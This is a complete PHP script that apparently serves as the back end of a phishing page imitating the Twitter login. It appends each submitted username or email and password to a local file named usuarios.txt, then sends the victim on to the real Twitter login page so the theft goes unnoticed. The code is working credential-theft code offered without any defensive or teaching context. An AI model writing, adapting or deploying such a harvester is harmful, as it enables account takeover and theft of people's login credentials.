<?php

file_put_contents("usuarios.txt", "Cuenta: " . $_POST['usernameOrEmail'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/login');
exit();
?>
